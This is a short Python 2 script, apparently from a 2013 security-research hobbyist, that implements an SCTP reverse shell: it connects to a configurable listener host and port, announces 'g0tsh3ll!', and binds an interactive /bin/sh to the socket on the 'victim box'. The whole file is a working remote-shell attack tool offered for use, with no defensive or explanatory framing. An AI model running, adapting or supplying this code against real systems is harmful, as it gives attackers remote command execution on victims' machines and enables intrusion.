#!/usr/bin/python
# SCTP Reverse Shell (TCP mode)
# Requires pysctp and sctp to be working
# on the victim box.
# My perfect saturday... Involves #
# infodox - Insecurety Research 2013
# insecurety.net | @info_dox

# I probably imported too much things. Who cares.
import socket
import _sctp
import sctp
from sctp import *
import os
import subprocess

host = '127.0.0.1' # CHANGEME
port = 1337 # CHANGEME

socket.setdefaulttimeout(60)
s = None
try:
    s = sctpsocket_tcp(socket.AF_INET)
    s.connect((host,port))
    s.send('g0tsh3ll!\n')
    save = [ os.dup(i) for i in range(0,3) ]
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    shell = subprocess.call(["/bin/sh","-i"])
    [ os.dup2(save[i],i) for i in range(0,3)]
    [ os.close(save[i]) for i in range(0,3)]
    os.close(s.fileno())
except Exception:
    print "Connection Failed! Is there even a listener?"
    pass
